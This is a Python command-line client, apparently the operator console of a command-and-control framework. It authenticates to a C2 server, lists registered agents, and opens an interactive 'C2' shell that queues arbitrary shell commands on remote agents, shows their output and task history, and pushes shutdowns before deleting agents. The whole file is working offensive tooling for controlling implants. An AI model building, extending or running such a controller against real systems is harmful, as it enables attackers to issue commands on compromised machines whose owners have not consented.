import requests
import time
import os
import getpass

SERVER_URL = "http://0.0.0.0:5000"


# ---------------- AUTH ----------------

def load_operator_token():
    token = os.getenv("OPERATOR_TOKEN")
    if not token:
        token = getpass.getpass("Enter OPERATOR_TOKEN: ")
    return token


OPERATOR_TOKEN = load_operator_token()
HEADERS = {"Authorization": f"Bearer {OPERATOR_TOKEN}"}


# ---------------- SERVER CALLS ----------------

def get_agents():
    try:
        r = requests.get(f"{SERVER_URL}/api/agents", headers=HEADERS, timeout=10)

        if r.status_code == 403:
            print("[!] Authentication failed — invalid operator token.")
            exit(1)

        elif r.status_code == 200:
            agents = r.json()
            if not agents:
                print("[-] No agents registered yet.")
                return []

            print("\n--- Registered Agents ---")
            for idx, a in enumerate(agents):
                last_seen_sec = int(time.time() - a['last_seen'])
                print(f"[{idx}] {a['agent_id']} (Last seen: {last_seen_sec}s ago)")
            print("-------------------------\n")
            return agents

        else:
            print(f"[!] Target Server Error: {r.status_code}")

    except Exception as e:
        print(f"[!] Request Error: {e}")

    return []


def delete_agent(agent_id):
    try:
        r = requests.delete(
            f"{SERVER_URL}/api/agent/{agent_id}",
            headers=HEADERS,
            timeout=10
        )

        if r.status_code == 403:
            print("[!] Authentication failed — exiting.")
            exit(1)

        if r.status_code == 404:
            print("[!] Unknown agent.")
            return

        if r.status_code == 200:
            print(f"[+] Agent {agent_id} deleted successfully.")
        else:
            print(f"[!] Server error: {r.status_code}")

    except Exception as e:
        print(f"[!] Request Error: {e}")


def wait_for_result(agent_id, task_id, timeout=60):
    start = time.time()

    while time.time() - start < timeout:
        try:
            r = requests.get(
                f"{SERVER_URL}/api/results/{agent_id}",
                headers=HEADERS,
                timeout=10
            )

            if r.status_code == 200:
                results = r.json()

                for res in results:
                    if res["task_id"] == task_id:
                        print("\n--- Result ---")
                        print(res["output"])
                        print("--------------\n")
                        return

        except Exception:
            pass

        time.sleep(2)

    print(f"[-] No result yet (polled for {timeout}s).")


def send_command(agent_id, command, wait=True):
    payload = {
        "agent_id": agent_id,
        "type": "shell",
        "command": command
    }

    try:
        r = requests.post(
            f"{SERVER_URL}/api/push",
            json=payload,
            headers=HEADERS,
            timeout=10
        )

        if r.status_code != 200:
            print(f"[!] Failed to queue command. Server returned: {r.status_code} - {r.text}")
            return

        response_json = r.json()
        task_id = response_json.get("task_id")

        if not task_id:
            print("[!] Server did not return task_id.")
            return

        print(f"[+] Task {task_id} queued.")
        if wait:
            print("Waiting for result...")
            wait_for_result(agent_id, task_id)

    except Exception as e:
        print(f"[!] Request Error: {e}")


def get_results_list(agent_id):
    try:
        r = requests.get(
            f"{SERVER_URL}/api/results/{agent_id}",
            headers=HEADERS,
            timeout=10
        )
        if r.status_code == 200:
            results = r.json()
            if not results:
                print("[-] No results found.")
                return
            
            print(f"\n--- History for {agent_id} ---")
            print(f"{'ID':<4} {'Type':<10} {'Status':<12} {'Command/Result'}")
            print("-" * 60)
            for res in results:
                tid = res['id']
                status = res['status'].upper()
                cmd = res.get('command', '')
                
                if res['output']:
                    preview = res['output'].strip().replace('\n', ' ')[:40]
                    content = f"{cmd} -> {preview}..." if cmd else preview
                else:
                    content = f"{cmd}"
                
                print(f"{tid:<4} {res['type']:<10} {status:<12} {content}")
            print("-" * 60)
            print("[Tip] Use 'results <index> <id>' to see full output of a task.\n")
        else:
            print(f"[!] Error: {r.status_code}")
    except Exception as e:
        print(f"[!] Request Error: {e}")


def show_full_result(agent_id, task_id):
    try:
        r = requests.get(
            f"{SERVER_URL}/api/results/{agent_id}",
            headers=HEADERS,
            timeout=10
        )
        if r.status_code == 200:
            results = r.json()
            for res in results:
                if res['id'] == task_id:
                    print(f"\n--- Full Result for Task {task_id} ---")
                    print(res['output'] or "[-] (No output yet)")
                    print("-" * 30 + "\n")
                    return
            print(f"[!] Task {task_id} not found in history.")
        else:
            print(f"[!] Error: {r.status_code}")
    except Exception as e:
        print(f"[!] Request Error: {e}")


# ---------------- INTERACTIVE SHELL ----------------

def interact(agent_id):
    print(f"\n[+] Interactive shell mode with: {agent_id}")
    print("[+] Type 'exit' to return to main menu.")
    print("[+] Prefix command with '!' to queue without waiting (async).")
    print("[+] Type 'history' to see recent tasks or 'cat <id>' to see full output.\n")

    while True:
        try:
            cmd = input(f"C2 ({agent_id})> ").strip()

            if cmd.lower() in ["exit", "back", "quit"]:
                break

            if not cmd:
                continue

            if cmd.startswith("!"):
                send_command(agent_id, cmd[1:].strip(), wait=False)
            elif cmd.lower() == "history" or cmd.lower() == "ls":
                get_results_list(agent_id)
            elif cmd.lower().startswith("cat ") or cmd.lower().startswith("show "):
                try:
                    tid = int(cmd.split()[1])
                    show_full_result(agent_id, tid)
                except:
                    print("[!] Usage: cat <task_id>")
            else:
                send_command(agent_id, cmd)

        except KeyboardInterrupt:
            print("")
            break


# ---------------- MAIN LOOP ----------------

def main():
    print("=========================")
    print("  C2 Server Console CLI  ")
    print("=========================\n")

    while True:
        try:
            choice = input("C2 (main)> ").strip()

            # Exit
            if choice.lower() in ["exit", "quit", "q"]:
                print("Exiting...")
                break

            # List agents
            elif choice.lower() in ["ls", "list", "agents"]:
                get_agents()

            # Interact
            elif choice.lower().startswith("interact"):
                parts = choice.split()
                if len(parts) == 2:
                    agents = get_agents()
                    try:
                        idx = int(parts[1])
                        if 0 <= idx < len(agents):
                            interact(agents[idx]["agent_id"])
                        else:
                            print("[!] Invalid agent index.")
                    except ValueError:
                        print("[!] Use numeric index: interact 0")
                else:
                    print("Usage: interact <agent_index>")

            # Delete
            elif choice.lower().startswith("delete"):
                parts = choice.split()
                if len(parts) == 2:
                    agents = get_agents()
                    try:
                        idx = int(parts[1])
                        if 0 <= idx < len(agents):
                            agent_id = agents[idx]["agent_id"]
                            confirm = input(
                                f"Shutdown and delete {agent_id}? (y/n): "
                            ).strip().lower()

                            if confirm == "y":
                                # Push shutdown task first
                                shutdown_payload = {
                                    "agent_id": agent_id,
                                    "type": "shutdown"
                                }
                                requests.post(f"{SERVER_URL}/api/push", json=shutdown_payload, headers=HEADERS, timeout=5)
                                delete_agent(agent_id)
                            else:
                                print("[*] Deletion cancelled.")
                        else:
                            print("[!] Invalid agent index.")
                    except ValueError:
                        print("[!] Use numeric index: delete 0")
                else:
                    print("Usage: delete <agent_index>")

            # Results / History
            elif choice.lower().startswith("results") or choice.lower().startswith("history"):
                parts = choice.split()
                if len(parts) >= 2:
                    agents = get_agents()
                    try:
                        idx = int(parts[1])
                        if 0 <= idx < len(agents):
                            aid = agents[idx]["agent_id"]
                            if len(parts) == 3:
                                tid = int(parts[2])
                                show_full_result(aid, tid)
                            else:
                                get_results_list(aid)
                        else:
                            print("[!] Invalid agent index.")
                    except ValueError:
                        print("[!] Use numeric index: history 0 [task_id]")
                else:
                    print("Usage: history <index> [task_id]")

            else:
                print("Available commands:")
                print("  ls / list            - Show registered agents")
                print("  interact <index>     - Open interactive shell")
                print("  history <index>      - View result history for an agent")
                print("  delete <index>       - Delete an agent (force disconnect)")
                print("  exit / quit          - Close console\n")

        except KeyboardInterrupt:
            print("\nExiting...")
            break


if __name__ == "__main__":
    main()
